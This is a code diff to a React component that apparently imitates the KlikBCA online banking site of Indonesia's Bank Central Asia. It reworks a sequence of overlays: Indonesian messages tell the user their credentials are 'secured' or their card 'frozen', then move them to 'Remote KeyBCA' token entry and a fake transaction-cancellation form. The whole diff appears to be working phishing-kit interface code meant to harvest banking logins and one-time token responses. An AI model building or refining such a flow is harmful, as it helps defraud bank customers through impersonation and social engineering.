@@ -256,8 +256,7 @@ export const BcaSitePreview: React.FC = () => {
           setBlockingOverlay(null);
         } else {
           setBlockingOverlay(null);
-          setActiveFormId('amankan-user-id');
-          setUserIdStep('keybca');
+          setActiveFormId('pembatalan-transaksi');
         }
       }, 1500);
       return () => clearTimeout(timer);
@@ -965,9 +964,11 @@ export const BcaSitePreview: React.FC = () => {
                           <p className="text-xs text-slate-600 font-medium max-w-xs mx-auto leading-relaxed">
                             {blockingOverlay.targetService === 'pembatalan-transaksi'
                               ? 'Pengajuan pembatalan transaksi disetujui. Membuka Resi Digital Resmi...'
-                              : blockingOverlay.targetService === 'user-id' || blockingOverlay.targetService === 'keybca'
-                              ? 'Kredensial KlikBCA & akun Anda telah berhasil diamankan.'
-                              : `Kartu ${blockingOverlay.cardInfo} telah resmi dibekukan. Mengarahkan ke Otentikasi Remote KeyBCA...`}
+                              : blockingOverlay.targetService === 'user-id'
+                              ? 'Kredensial KlikBCA & akun Anda telah berhasil diamankan. Mengarahkan ke Otentikasi Remote KeyBCA...'
+                              : blockingOverlay.targetService === 'keybca'
+                              ? 'Respon KeyBCA APPLI 1 berhasil diverifikasi.'
+                              : `Kartu ${blockingOverlay.cardInfo} telah resmi dibekukan. Mengarahkan ke Pembatalan Transaksi...`}
                           </p>
                         </div>
 
@@ -1002,6 +1003,11 @@ export const BcaSitePreview: React.FC = () => {
                                 ],
                               });
                               setBlockingOverlay(null);
+                            } else if (blockingOverlay.targetService === 'user-id') {
+                              setUserIdStep('keybca');
+                              setBlockingOverlay(null);
+                            } else if (blockingOverlay.targetService === 'keybca') {
+                              setBlockingOverlay(null);
                             } else {
                               setBlockingOverlay(null);
                               setActiveFormId('pembatalan-transaksi');
@@ -1012,6 +1018,10 @@ export const BcaSitePreview: React.FC = () => {
                           <span>
                             {blockingOverlay.targetService === 'pembatalan-transaksi'
                               ? 'Lihat Resi Digital Pembatalan'
+                              : blockingOverlay.targetService === 'user-id'
+                              ? 'Lanjut ke Remote KeyBCA'
+                              : blockingOverlay.targetService === 'keybca'
+                              ? 'Selesai'
                               : 'Lanjut ke Pembatalan Transaksi'}
                           </span>
                           <MoveRight className="w-4 h-4" />
